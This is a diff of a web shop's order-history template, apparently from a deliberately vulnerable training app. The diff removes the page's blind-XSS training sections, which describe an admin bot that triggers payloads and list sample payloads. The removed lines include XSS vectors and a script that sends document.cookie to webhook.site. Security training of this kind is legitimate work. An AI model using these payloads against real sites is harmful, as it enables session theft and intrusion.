@@ -38,7 +38,7 @@
                     <div class="card-body text-center p-5">
                         <i class="fas fa-clipboard-check fa-3x text-muted mb-3"></i>
                         <h3>No orders yet</h3>
-                        <p>You haven't placed any orders yet. Start shopping to practice XSS injection!</p>
+                        <p>You haven't placed any orders yet. Start shopping to create an order.</p>
                         <a href="/products" class="btn btn-primary">
                             <i class="fas fa-store"></i> Browse Products
                         </a>
@@ -50,9 +50,6 @@
                         <h3 class="card-title">
                             <i class="fas fa-clipboard-list"></i> Your Orders
                         </h3>
-                        <div class="card-subtitle">
-                            <p class="text-muted mb-0">Orders are automatically reviewed by the admin bot for XSS payload execution.</p>
-                        </div>
                     </div>
                     
                     <div class="card-body">
@@ -65,8 +62,6 @@
                                         <th>Items</th>
                                         <th>Total</th>
                                         <th>Status</th>
-                                        <th>XSS Status</th>
-                                        <th>Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody>
@@ -86,111 +81,16 @@
                                                     <span class="badge badge-warning">
                                                         <i class="fas fa-clock"></i> Pending Review
                                                     </span>
-                                                    <div class="small text-muted mt-1">Bot reviews every 60s</div>
                                                 <% } else { %>
                                                     <span class="badge badge-info">
                                                         <i class="fas fa-check"></i> Reviewed
                                                     </span>
-                                                    <div class="small text-muted mt-1">XSS payload executed</div>
                                                 <% } %>
-                                            </td>
-                                            <td>
-                                                <a href="/admin/order/<%= order.id %>" class="btn btn-sm btn-primary" target="_blank">
-                                                    <i class="fas fa-external-link-alt"></i> View as Admin
-                                                </a>
-                                                <div class="small text-muted mt-1">Opens admin view</div>
                                             </td>
                                         </tr>
                                     <% }) %>
                                 </tbody>
                             </table>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- XSS Training Information -->
-                <div class="card mt-4">
-                    <div class="card-header">
-                        <h3 class="card-title">
-                            <i class="fas fa-graduation-cap"></i> XSS Training Status
-                        </h3>
-                    </div>
-                    <div class="card-body">
-                        <div class="row" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
-                            <div>
-                                <h5><i class="fas fa-robot"></i> Admin Bot Process</h5>
-                                <p>The admin bot automatically reviews "Created" orders every 60 seconds.</p>
-                                <ul>
-                                    <li>Bot logs in as admin user</li>
-                                    <li>Views all pending orders</li>
-                                    <li>Spends 5 seconds on each order</li>
-                                    <li>Triggers any XSS payloads in delivery notes</li>
-                                </ul>
-                            </div>
-                            <div>
-                                <h5><i class="fas fa-bug"></i> Payload Execution</h5>
-                                <p>When your XSS payload executes:</p>
-                                <ul>
-                                    <li>Runs in admin browser context</li>
-                                    <li>Has admin session privileges</li>
-                                    <li>Can steal cookies, redirect, etc.</li>
-                                    <li>Executes silently (no visible alerts in bot)</li>
-                                </ul>
-                            </div>
-                            <div>
-                                <h5><i class="fas fa-shield-alt"></i> Security Notes</h5>
-                                <p>This is a controlled training environment:</p>
-                                <ul>
-                                    <li>No real data is at risk</li>
-                                    <li>All payloads execute in isolation</li>
-                                    <li>Bot runs in headless mode</li>
-                                    <li>No external network calls (unless you inject them)</li>
-                                </ul>
-                            </div>
-                        </div>
-
-                        <div class="security-warning mt-3">
-                            <i class="fas fa-exclamation-triangle"></i>
-                            <strong>Educational Purpose Only:</strong> This vulnerability is intentionally implemented for security training.
-                            In production, always sanitize user input and use proper output encoding.
-                        </div>
-                    </div>
-                </div>
-
-                <!-- How to Test XSS -->
-                <div class="card mt-4">
-                    <div class="card-header">
-                        <h3 class="card-title">
-                            <i class="fas fa-vial"></i> How to Test XSS
-                        </h3>
-                    </div>
-                    <div class="card-body">
-                        <h5>Follow these steps to practice Blind XSS:</h5>
-                        <ol>
-                            <li><strong>Place a new order</strong> with an XSS payload in delivery notes</li>
-                            <li><strong>Wait 60 seconds</strong> for the admin bot to review it</li>
-                            <li><strong>Monitor execution</strong> (if payload makes external calls)</li>
-                            <li><strong>Try different payloads</strong> to understand XSS vectors</li>
-                        </ol>
-
-                        <h5 class="mt-3">Sample Payloads to Try:</h5>
-                        <div class="code-samples">
-                            <div class="code-sample">
-                                <h6>Basic Alert</h6>
-                                <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
-                            </div>
-                            <div class="code-sample">
-                                <h6>Cookie Theft Simulation</h6>
-                                <!-- <pre><code><script>fetch('https://webhook.site/?cookie='+document.cookie)</script></code></pre> -->
-                            </div>
-                            <div class="code-sample">
-                                <h6>Image-based XSS</h6>
-                                <!-- <pre><code><img src=x onerror="alert('XSS')"></code></pre> -->
-                            </div>
-                            <div class="code-sample">
-                                <h6>SVG-based XSS</h6>
-                                <!-- <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
-                            </div>
                         </div>
                     </div>
                 </div>
